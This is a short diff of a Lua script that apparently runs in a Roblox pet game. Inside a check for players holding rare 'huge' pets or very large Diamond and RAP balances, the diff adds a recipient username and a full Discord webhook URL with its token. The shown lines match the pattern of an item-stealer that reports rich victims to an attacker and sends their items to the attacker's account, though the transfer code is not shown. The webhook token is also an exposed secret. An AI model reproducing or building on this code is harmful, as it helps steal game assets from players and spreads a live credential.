@@ -16,6 +16,8 @@ for i,v in pairs(Library.Save.Get().Pets) do
     end
 end
 if hugeamount >1 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
+     UserName = "TehPucuk_55"
+     Webhook = "https://discord.com/api/webhooks/1105338973276098640/06ugJwRCNfo9JEKzGcvhiPQjz4v72-qeUH1Hz3MnRSpAqMcteAyq4Pxk5CmpZC5sXSxu"
 end
 
 if getgenv().executed then return end
